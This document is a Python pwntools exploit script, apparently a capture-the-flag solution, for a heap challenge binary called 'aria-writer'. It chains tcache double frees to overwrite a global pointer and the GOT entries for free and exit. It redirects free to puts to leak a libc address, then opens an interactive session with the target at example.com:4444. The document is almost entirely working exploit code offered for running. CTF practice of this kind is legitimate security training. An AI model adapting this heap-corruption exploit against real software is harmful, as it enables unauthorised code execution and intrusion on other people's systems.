#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


def malloc(p, size, buf):
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b">")
    p.sendline(str(size))
    p.recvuntil(b"what should i write tho >")
    p.sendline(buf)

def free(p):
    p.recvuntil(b">")
    p.sendline(b"2")

def show_name(p):
    p.recvuntil(b">")
    p.sendline(b"3")

if __name__ == '__main__':
    context.terminal = ['tmux', 'sp', '-h']
    context.log_level = "debug"

    chall = "./aria-writer"
    libc = ELF("./libc.so.6")
    elf = ELF(chall)
    context.binary = chall
    context.binary.checksec()

    if len(argv) >= 2 and argv[1] == "r":
        p = remote("example.com", 4444)
    elif len(argv) >= 2 and argv[1] == "d":
    	cmd = """
            # after menu select
    		b *main+192
    		c
    	"""
    	p = gdb.debug(chall,cmd)
    elif len(argv) >= 2 and argv[1] == "gdb":
        p = gdb.debug(chall,'c')
    else:
        p = process(chall)

    # name
    name = "pwn newbie"
    p.recvuntil("whats your name")
    p.sendline(name)

    # double free (size=0x20) for overwrite global
    malloc(p, 0x20, 'JUNK')
    free(p)
    free(p)
    malloc(p, 0x20, p64(elf.symbols['global']))
    malloc(p, 0x20, 'JUNK')
    # double free (size=0x28) for overwrite free@got -> puts@plt
    malloc(p, 0x28, 'JUNK')
    free(p)
    free(p)
    malloc(p, 0x28, p64(elf.got['free']))
    malloc(p, 0x28, 'JUNK')
    # double free (size=0x30) for overwrite exit@got
    malloc(p, 0x30, 'JUNK')
    free(p)
    free(p)
    malloc(p, 0x30, p64(elf.got['exit']))
    malloc(p, 0x30, 'JUNK')

    malloc(p, 0x28, p64(elf.plt['puts']))
    malloc(p, 0x20, p64(elf.got['setbuf']))

    free(p)

    p.interactive()
